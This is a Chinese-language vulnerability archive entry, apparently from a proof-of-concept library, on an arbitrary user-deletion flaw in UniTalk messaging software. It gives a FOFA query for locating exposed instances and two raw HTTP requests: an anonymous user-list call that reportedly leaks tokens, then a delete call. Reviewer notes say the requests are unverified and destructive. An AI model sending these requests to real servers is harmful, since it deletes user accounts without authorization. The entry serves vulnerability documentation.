---
source: "wy876 漏洞文库"
title: "UniTalk getallusers泄露标识后删除用户"
product: "UniTalk"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知"
prerequisites: "匿名列表声称+被泄露token"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/itmebnwadmoelggp"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/UniTalk/unitalk%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"unitalk\""
id: "vw-280afc72773701b1f8ab3061"
entity_id: "ve-280afc72773701b1f8ab3061"
schema_version: "1"
previous_fofa_unverified: "title="
---

# UniTalk getallusers泄露标识后删除用户

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：UniTalk；getallusers泄露标识后删除用户
- 版本、配置及部署条件：版本未知
- 认证与权限前提：匿名列表声称+被泄露token
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 没有列表响应证明token含义，删除无目标ID需解释token是对象标识还是会话凭据
- 删除操作有破坏副作用，不应作默认检测；缺删除前后/修复证据

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在任意用户删除漏洞

## 二、影响版本
+ unitalk

## 三、资产测绘
+ fofa`title="unitalk"`
+ 特征


## 四、漏洞复现
先获取token

```http
POST /unitalk/v1.0/user/getallusers.json HTTP/1.1
Host: 172.18.14.68:7778
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35
Content-Type: application/json;charset=UTF-8

{}
```


删除用户

```http
POST /unitalk/v1.0/user/delete.json HTTP/1.1
Host: 172.18.14.68:7778
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Content-Length: 48

{"token":"87535651-49c2-4a19-8aeb-401fc16c2366"}
```

> 请求长度说明：原资料 Content-Length 为 48；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/itmebnwadmoelggp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
